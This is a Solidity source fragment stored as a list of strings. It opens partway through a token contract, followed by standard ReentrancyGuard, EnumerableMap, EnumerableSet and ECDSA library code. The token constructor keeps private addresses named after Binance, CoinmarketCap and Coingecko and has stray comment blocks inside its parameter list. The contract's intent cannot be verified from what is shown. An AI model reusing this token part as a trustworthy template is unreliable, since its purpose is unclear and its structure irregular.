(address => uint) public balanceOf;\n', '    mapping (address => mapping (address => uint)) public allowance;\n', '    uint constant public decimals = 18;\n', '    uint public totalSupply;\n', '    string public name;\n', '    string public symbol;\n', '    address private owner;\n', '    address private dev;\n', '    address private marketing;\n', '    address private adviser;\n', '    address private privateSale;\n', '    address private publicSale;\n', '    address private community;\n', '    address private Binance;\n', '    address private CoinmarketCap;\n', '    address private Coingecko;\n', '    address constant internal \n', '    UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap v2\n', '    constructor(\n', '        address _dev, address _marketing, address _adviser, address _privateSale, address _publicSale, address _community,\n', '    /**\n', '     * \n', '     * navigation\n', '     * \n', '    */\n', '        address _Binance,\n', '        address _CoinmarketCap,\n', '        address _Coingecko,\n', '        string memory _name,\n', '        string memory _symbol,\n', '        uint256 _supply) \n', '        payable public {\n', '    /**\n', '     * Fixed flow\n', '    */\n', '        name = _name;\n', '        symbol = _symbol;\n', '        totalSupply = _supply;\n', '        owner = msg.sender;\n', '        dev = _dev;\n', '        marketing = _marketing;\n', '        adviser = _adviser;\n', '        privateSale = _privateSale;\n', '        publicSale = _publicSale;\n', '        community = _community;\n', '        Binance = _Binance;\n', '        CoinmarketCap = _CoinmarketCap;\n', '        Coingecko = _Coingecko;\n', '        balanceOf[msg.sender] = totalSupply;\n', '        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1); //Uniswap v2\n', '        emit Transfer(address(0x0), msg.sender, totalSupply);\n', '    }\n', '}\n', '/**\n', ' * @dev Contract module that helps prevent reentrant calls to a function.\n', ' *\n', ' * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\n', ' * available, which can be applied to functions to make sure there are no nested\n', ' * (reentrant) calls to them.\n', ' *\n', ' * Note that because there is a single `nonReentrant` guard, functions marked as\n', ' * `nonReentrant` may not call one another. This can be worked around by making\n', ' * those functions `private`, and then adding `external` `nonReentrant` entry\n', ' * points to them.\n', ' *\n', ' * TIP: If you would like to learn more about reentrancy and alternative ways\n', ' * to protect against it, check out our blog post\n', ' * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\n', ' */\n', 'contract ReentrancyGuards {\n', '    // Booleans are more expensive than uint256 or any type that takes up a full\n', '    // word because each write operation emits an extra SLOAD to first read the\n', "    // slot's contents, replace the bits taken up by the boolean, and then write\n", "    // back. This is the compiler's defense against contract upgrades and\n", '    // pointer aliasing, and it cannot be disabled.\n', '\n', '    // The values being non-zero value makes deployment a bit more expensive,\n', '    // but in exchange the refund on every call to nonReentrant will be lower in\n', '    // amount. Since refunds are capped to a percentage of the total\n', "    // transaction's gas, it is best to keep them low in cases like this one, to\n", '    // increase the likelihood of the full refund coming into effect.\n', '    uint256 private constant _NOT_ENTERED = 1;\n', '    uint256 private constant _ENTERED = 2;\n', '\n', '    uint256 private _status;\n', '\n', '    constructor () internal {\n', '        _status = _NOT_ENTERED;\n', '    }\n', '\n', '    /**\n', '     * @dev Prevents a contract from calling itself, directly or indirectly.\n', '     * Calling a `nonReentrant` function from another `nonReentrant`\n', '     * function is not supported. It is possible to prevent this from happening\n', '     * by making the `nonReentrant` function external, and make it call a\n', '     * `private` function that does the actual work.\n', '     */\n', '    modifier nonReentrant() {\n', '        // On the first call to nonReentrant, _notEntered will be true\n', '        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");\n', '\n', '        // Any calls to nonReentrant after this point will fail\n', '        _status = _ENTERED;\n', '\n', '        _;\n', '\n', '        // By storing the original value once again, a refund is triggered (see\n', '        // https://eips.ethereum.org/EIPS/eip-2200)\n', '        _status = _NOT_ENTERED;\n', '    }\n', '}\n', '/**\n', " * @dev Library for managing an enumerable variant of Solidity's\n", ' * https://solidity.readthedocs.io/en/latest/types.html#mapping-types[`mapping`]\n', ' * type.\n', ' *\n', ' * Maps have the following properties:\n', ' *\n', ' * - Entries are added, removed, and checked for existence in constant time\n', ' * (O(1)).\n', ' * - Entries are enumerated in O(n). No guarantees are made on the ordering.\n', ' *\n', ' * ```\n', ' * contract Example {\n', ' *     // Add the library methods\n', ' *     using EnumerableMap for EnumerableMap.UintToAddressMap;\n', ' *\n', ' *     // Declare a set state variable\n', ' *     EnumerableMap.UintToAddressMap private myMap;\n', ' * }\n', ' * ```\n', ' *\n', ' * As of v3.0.0, only maps of type `uint256 -> address` (`UintToAddressMap`) are\n', ' * supported.\n', ' */\n', 'library EnumerableMap {\n', '    // To implement this library for multiple types with as little code\n', '    // repetition as possible, we write it in terms of a generic Map type with\n', '    // bytes32 keys and values.\n', '    // The Map implementation uses private functions, and user-facing\n', '    // implementations (such as Uint256ToAddressMap) are just wrappers around\n', '    // the underlying Map.\n', '    // This means that we can only create new EnumerableMaps for types that fit\n', '    // in bytes32.\n', '\n', '    struct MapEntry {\n', '        bytes32 _key;\n', '        bytes32 _value;\n', '    }\n', '\n', '    struct Map {\n', '        // Storage of map keys and values\n', '        MapEntry[] _entries;\n', '\n', '        // Position of the entry defined by a key in the `entries` array, plus 1\n', '        // because index 0 means a key is not in the map.\n', '        mapping (bytes32 => uint256) _indexes;\n', '    }\n', '\n', '    /**\n', '     * @dev Adds a key-value pair to a map, or updates the value for an existing\n', '     * key. O(1).\n', '     *\n', '     * Returns true if the key was added to the map, that is if it was not\n', '     * already present.\n', '     */\n', '    function _set(Map storage map, bytes32 key, bytes32 value) private returns (bool) {\n', "        // We read and store the key's index to prevent multiple reads from the same storage slot\n", '        uint256 keyIndex = map._indexes[key];\n', '\n', '        if (keyIndex == 0) { // Equivalent to !contains(map, key)\n', '            map._entries.push(MapEntry({ _key: key, _value: value }));\n', '            // The entry is stored at length-1, but we add 1 to all indexes\n', '            // and use 0 as a sentinel value\n', '            map._indexes[key] = map._entries.length;\n', '            return true;\n', '        } else {\n', '            map._entries[keyIndex - 1]._value = value;\n', '            return false;\n', '        }\n', '    }\n', '\n', '    /**\n', '     * @dev Removes a key-value pair from a map. O(1).\n', '     *\n', '     * Returns true if the key was removed from the map, that is if it was present.\n', '     */\n', '    function _remove(Map storage map, bytes32 key) private returns (bool) {\n', "        // We read and store the key's index to prevent multiple reads from the same storage slot\n", '        uint256 keyIndex = map._indexes[key];\n', '\n', '        if (keyIndex != 0) { // Equivalent to contains(map, key)\n', '            // To delete a key-value pair from the _entries array in O(1), we swap the entry to delete with the last one\n', "            // in the array, and then remove the last entry (sometimes called as 'swap and pop').\n", '            // This modifies the order of the array, as noted in {at}.\n', '\n', '            uint256 toDeleteIndex = keyIndex - 1;\n', '            uint256 lastIndex = map._entries.length - 1;\n', '\n', '            // When the entry to delete is the last one, the swap operation is unnecessary. However, since this occurs\n', "            // so rarely, we still do the swap anyway to avoid the gas cost of adding an 'if' statement.\n", '\n', '            MapEntry storage lastEntry = map._entries[lastIndex];\n', '\n', '            // Move the last entry to the index where the entry to delete is\n', '            map._entries[toDeleteIndex] = lastEntry;\n', '            // Update the index for the moved entry\n', '            map._indexes[lastEntry._key] = toDeleteIndex + 1; // All indexes are 1-based\n', '\n', '            // Delete the slot where the moved entry was stored\n', '            map._entries.pop();\n', '\n', '            // Delete the index for the deleted slot\n', '            delete map._indexes[key];\n', '\n', '            return true;\n', '        } else {\n', '            return false;\n', '        }\n', '    }\n', '\n', '    /**\n', '     * @dev Returns true if the key is in the map. O(1).\n', '     */\n', '    function _contains(Map storage map, bytes32 key) private view returns (bool) {\n', '        return map._indexes[key] != 0;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the number of key-value pairs in the map. O(1).\n', '     */\n', '    function _length(Map storage map) private view returns (uint256) {\n', '        return map._entries.length;\n', '    }\n', '\n', '   /**\n', '    * @dev Returns the key-value pair stored at position `index` in the map. O(1).\n', '    *\n', '    * Note that there are no guarantees on the ordering of entries inside the\n', '    * array, and it may change when more entries are added or removed.\n', '    *\n', '    * Requirements:\n', '    *\n', '    * - `index` must be strictly less than {length}.\n', '    */\n', '    function _at(Map storage map, uint256 index) private view returns (bytes32, bytes32) {\n', '        require(map._entries.length > index, "EnumerableMap: index out of bounds");\n', '\n', '        MapEntry storage entry = map._entries[index];\n', '        return (entry._key, entry._value);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the value associated with `key`.  O(1).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `key` must be in the map.\n', '     */\n', '    function _get(Map storage map, bytes32 key) private view returns (bytes32) {\n', '        return _get(map, key, "EnumerableMap: nonexistent key");\n', '    }\n', '\n', '    /**\n', '     * @dev Same as {_get}, with a custom error message when `key` is not in the map.\n', '     */\n', '    function _get(Map storage map, bytes32 key, string memory errorMessage) private view returns (bytes32) {\n', '        uint256 keyIndex = map._indexes[key];\n', '        require(keyIndex != 0, errorMessage); // Equivalent to contains(map, key)\n', '        return map._entries[keyIndex - 1]._value; // All indexes are 1-based\n', '    }\n', '\n', '    // UintToAddressMap\n', '\n', '    struct UintToAddressMap {\n', '        Map _inner;\n', '    }\n', '\n', '    /**\n', '     * @dev Adds a key-value pair to a map, or updates the value for an existing\n', '     * key. O(1).\n', '     *\n', '     * Returns true if the key was added to the map, that is if it was not\n', '     * already present.\n', '     */\n', '    function set(UintToAddressMap storage map, uint256 key, address value) internal returns (bool) {\n', '        return _set(map._inner, bytes32(key), bytes32(uint256(value)));\n', '    }\n', '\n', '    /**\n', '     * @dev Removes a value from a set. O(1).\n', '     *\n', '     * Returns true if the key was removed from the map, that is if it was present.\n', '     */\n', '    function remove(UintToAddressMap storage map, uint256 key) internal returns (bool) {\n', '        return _remove(map._inner, bytes32(key));\n', '    }\n', '\n', '    /**\n', '     * @dev Returns true if the key is in the map. O(1).\n', '     */\n', '    function contains(UintToAddressMap storage map, uint256 key) internal view returns (bool) {\n', '        return _contains(map._inner, bytes32(key));\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the number of elements in the map. O(1).\n', '     */\n', '    function length(UintToAddressMap storage map) internal view returns (uint256) {\n', '        return _length(map._inner);\n', '    }\n', '\n', '   /**\n', '    * @dev Returns the element stored at position `index` in the set. O(1).\n', '    * Note that there are no guarantees on the ordering of values inside the\n', '    * array, and it may change when more values are added or removed.\n', '    *\n', '    * Requirements:\n', '    *\n', '    * - `index` must be strictly less than {length}.\n', '    */\n', '    function at(UintToAddressMap storage map, uint256 index) internal view returns (uint256, address) {\n', '        (bytes32 key, bytes32 value) = _at(map._inner, index);\n', '        return (uint256(key), address(uint256(value)));\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the value associated with `key`.  O(1).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `key` must be in the map.\n', '     */\n', '    function get(UintToAddressMap storage map, uint256 key) internal view returns (address) {\n', '        return address(uint256(_get(map._inner, bytes32(key))));\n', '    }\n', '\n', '    /**\n', '     * @dev Same as {get}, with a custom error message when `key` is not in the map.\n', '     */\n', '    function get(UintToAddressMap storage map, uint256 key, string memory errorMessage) internal view returns (address) {\n', '        return address(uint256(_get(map._inner, bytes32(key), errorMessage)));\n', '    }\n', '}\n', '\n', '/**\n', ' * @dev Library for managing\n', ' * https://en.wikipedia.org/wiki/Set_(abstract_data_type)[sets] of primitive\n', ' * types.\n', ' *\n', ' * Sets have the following properties:\n', ' *\n', ' * - Elements are added, removed, and checked for existence in constant time\n', ' * (O(1)).\n', ' * - Elements are enumerated in O(n). No guarantees are made on the ordering.\n', ' *\n', ' * ```\n', ' * contract Example {\n', ' *     // Add the library methods\n', ' *     using EnumerableSet for EnumerableSet.AddressSet;\n', ' *\n', ' *     // Declare a set state variable\n', ' *     EnumerableSet.AddressSet private mySet;\n', ' * }\n', ' * ```\n', ' *\n', ' * As of v3.0.0, only sets of type `address` (`AddressSet`) and `uint256`\n', ' * (`UintSet`) are supported.\n', ' */\n', 'library EnumerableSet {\n', '    // To implement this library for multiple types with as little code\n', '    // repetition as possible, we write it in terms of a generic Set type with\n', '    // bytes32 values.\n', '    // The Set implementation uses private functions, and user-facing\n', '    // implementations (such as AddressSet) are just wrappers around the\n', '    // underlying Set.\n', '    // This means that we can only create new EnumerableSets for types that fit\n', '    // in bytes32.\n', '\n', '    struct Set {\n', '        // Storage of set values\n', '        bytes32[] _values;\n', '\n', '        // Position of the value in the `values` array, plus 1 because index 0\n', '        // means a value is not in the set.\n', '        mapping (bytes32 => uint256) _indexes;\n', '    }\n', '\n', '    /**\n', '     * @dev Add a value to a set. O(1).\n', '     *\n', '     * Returns true if the value was added to the set, that is if it was not\n', '     * already present.\n', '     */\n', '    function _add(Set storage set, bytes32 value) private returns (bool) {\n', '        if (!_contains(set, value)) {\n', '            set._values.push(value);\n', '            // The value is stored at length-1, but we add 1 to all indexes\n', '            // and use 0 as a sentinel value\n', '            set._indexes[value] = set._values.length;\n', '            return true;\n', '        } else {\n', '            return false;\n', '        }\n', '    }\n', '\n', '    /**\n', '     * @dev Removes a value from a set. O(1).\n', '     *\n', '     * Returns true if the value was removed from the set, that is if it was\n', '     * present.\n', '     */\n', '    function _remove(Set storage set, bytes32 value) private returns (bool) {\n', "        // We read and store the value's index to prevent multiple reads from the same storage slot\n", '        uint256 valueIndex = set._indexes[value];\n', '\n', '        if (valueIndex != 0) { // Equivalent to contains(set, value)\n', '            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in\n', "            // the array, and then remove the last element (sometimes called as 'swap and pop').\n", '            // This modifies the order of the array, as noted in {at}.\n', '\n', '            uint256 toDeleteIndex = valueIndex - 1;\n', '            uint256 lastIndex = set._values.length - 1;\n', '\n', '            // When the value to delete is the last one, the swap operation is unnecessary. However, since this occurs\n', "            // so rarely, we still do the swap anyway to avoid the gas cost of adding an 'if' statement.\n", '\n', '            bytes32 lastvalue = set._values[lastIndex];\n', '\n', '            // Move the last value to the index where the value to delete is\n', '            set._values[toDeleteIndex] = lastvalue;\n', '            // Update the index for the moved value\n', '            set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based\n', '\n', '            // Delete the slot where the moved value was stored\n', '            set._values.pop();\n', '\n', '            // Delete the index for the deleted slot\n', '            delete set._indexes[value];\n', '\n', '            return true;\n', '        } else {\n', '            return false;\n', '        }\n', '    }\n', '\n', '    /**\n', '     * @dev Returns true if the value is in the set. O(1).\n', '     */\n', '    function _contains(Set storage set, bytes32 value) private view returns (bool) {\n', '        return set._indexes[value] != 0;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the number of values on the set. O(1).\n', '     */\n', '    function _length(Set storage set) private view returns (uint256) {\n', '        return set._values.length;\n', '    }\n', '\n', '   /**\n', '    * @dev Returns the value stored at position `index` in the set. O(1).\n', '    *\n', '    * Note that there are no guarantees on the ordering of values inside the\n', '    * array, and it may change when more values are added or removed.\n', '    *\n', '    * Requirements:\n', '    *\n', '    * - `index` must be strictly less than {length}.\n', '    */\n', '    function _at(Set storage set, uint256 index) private view returns (bytes32) {\n', '        require(set._values.length > index, "EnumerableSet: index out of bounds");\n', '        return set._values[index];\n', '    }\n', '\n', '    // AddressSet\n', '\n', '    struct AddressSet {\n', '        Set _inner;\n', '    }\n', '\n', '    /**\n', '     * @dev Add a value to a set. O(1).\n', '     *\n', '     * Returns true if the value was added to the set, that is if it was not\n', '     * already present.\n', '     */\n', '    function add(AddressSet storage set, address value) internal returns (bool) {\n', '        return _add(set._inner, bytes32(uint256(value)));\n', '    }\n', '\n', '    /**\n', '     * @dev Removes a value from a set. O(1).\n', '     *\n', '     * Returns true if the value was removed from the set, that is if it was\n', '     * present.\n', '     */\n', '    function remove(AddressSet storage set, address value) internal returns (bool) {\n', '        return _remove(set._inner, bytes32(uint256(value)));\n', '    }\n', '\n', '    /**\n', '     * @dev Returns true if the value is in the set. O(1).\n', '     */\n', '    function contains(AddressSet storage set, address value) internal view returns (bool) {\n', '        return _contains(set._inner, bytes32(uint256(value)));\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the number of values in the set. O(1).\n', '     */\n', '    function length(AddressSet storage set) internal view returns (uint256) {\n', '        return _length(set._inner);\n', '    }\n', '\n', '   /**\n', '    * @dev Returns the value stored at position `index` in the set. O(1).\n', '    *\n', '    * Note that there are no guarantees on the ordering of values inside the\n', '    * array, and it may change when more values are added or removed.\n', '    *\n', '    * Requirements:\n', '    *\n', '    * - `index` must be strictly less than {length}.\n', '    */\n', '    function at(AddressSet storage set, uint256 index) internal view returns (address) {\n', '        return address(uint256(_at(set._inner, index)));\n', '    }\n', '\n', '\n', '    // UintSet\n', '\n', '    struct UintSet {\n', '        Set _inner;\n', '    }\n', '\n', '    /**\n', '     * @dev Add a value to a set. O(1).\n', '     *\n', '     * Returns true if the value was added to the set, that is if it was not\n', '     * already present.\n', '     */\n', '    function add(UintSet storage set, uint256 value) internal returns (bool) {\n', '        return _add(set._inner, bytes32(value));\n', '    }\n', '\n', '    /**\n', '     * @dev Removes a value from a set. O(1).\n', '     *\n', '     * Returns true if the value was removed from the set, that is if it was\n', '     * present.\n', '     */\n', '    function remove(UintSet storage set, uint256 value) internal returns (bool) {\n', '        return _remove(set._inner, bytes32(value));\n', '    }\n', '\n', '    /**\n', '     * @dev Returns true if the value is in the set. O(1).\n', '     */\n', '    function contains(UintSet storage set, uint256 value) internal view returns (bool) {\n', '        return _contains(set._inner, bytes32(value));\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the number of values on the set. O(1).\n', '     */\n', '    function length(UintSet storage set) internal view returns (uint256) {\n', '        return _length(set._inner);\n', '    }\n', '\n', '   /**\n', '    * @dev Returns the value stored at position `index` in the set. O(1).\n', '    *\n', '    * Note that there are no guarantees on the ordering of values inside the\n', '    * array, and it may change when more values are added or removed.\n', '    *\n', '    * Requirements:\n', '    *\n', '    * - `index` must be strictly less than {length}.\n', '    */\n', '    function at(UintSet storage set, uint256 index) internal view returns (uint256) {\n', '        return uint256(_at(set._inner, index));\n', '    }\n', '}\n', '\n', '/**\n', ' * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.\n', ' *\n', ' * These functions can be used to verify that a message was signed by the holder\n', ' * of the private keys of a given address.\n', ' */\n', 'library ECDSA {\n', '    /**\n', '     * @dev Returns the address that signed a hashed message (`hash`) with\n', '     * `signature`. This address can then be used for verification purposes.\n', '     *\n', '     * The `ecrecover` EVM opcode allows for malleable (non-unique) signatures:\n', '     * this function rejects them by requiring the `s` value to be in the lower\n', '     * half order, and the `v` value to be either 27 or 28.\n', '     *\n', '     * IMPORTANT: `hash` _must_ be the result of a hash operation for the\n', '     * verification to be secure: it is possible to craft signatures that\n', '     * recover to arbitrary addresses for non-hashed data. A safe way to ensure\n', '     * this is by receiving a hash of the original message (which may otherwise\n', '     * be too long), and then calling {toEthSignedMessageHash} on it.\n', '     */\n', '    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {\n', '        // Check the signature length\n', '        if (signature.length != 65) {\n', '            revert("ECDSA: invalid signature length");\n', '        }\n', '\n', '        // Divide the signature in r, s and v variables\n', '        bytes32 r;\n', '        bytes32 s;\n', '        uint8 v;\n', '\n', '        // ecrecover takes the signature parameters, and the only way to get them\n', '        // currently is to use assembly.\n', '        // solhint-disable-next-line no-inline-assembly\n', '        assembly {\n', '            r := mload(add(signature, 0x20))\n', '            s := mload(add(signature, 0x40))\n', '            v := byte(0, mload(add(signature, 0x60)))\n', '        }\n', '\n', '        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n', '        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n', '        // the valid range for s in (281): 0 < s < secp256k1n  2 + 1, and for v in (282): v  {27, 28}. Most\n', '        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n', '        //\n', '        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n', '        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n', '        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\n', '        // these malleable signatures as well.\n', '        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {\n', '            revert("ECDSA: invalid signature \'s\' value");\n', '        }\n', '\n', '        if (v != 27 && v != 28) {\n', '            revert("ECDSA: invalid signature \'v\' value");\n', '        }\n', '\n', '        // If the signature is valid (and not malleable), return the signer address\n', '        address signer = ecrecover(hash, v, r, s);\n', '        require(signer != address(0), "ECDSA: invalid signature");\n', '\n', '        return signer;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns an Ethereum Signed Message, created from a `hash`. This\n', '     * replicates the behavior of the\n', '     * https://github.com/ethereum/wiki/wiki/JSON-RPC#eth_sign[`eth_sign`]\n', '     * JSON-RPC method.\n', '     *\n', '     * See {recover}.\n', '     */\n', '    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) {\n', '        // 32 is the length in bytes of hash,\n', '        // enforced by the type signature above\n', '        return keccak256(abi.encodePacked("\\x19Ethereum Signed Message:\\n32", hash));\n', '    }\n', '}']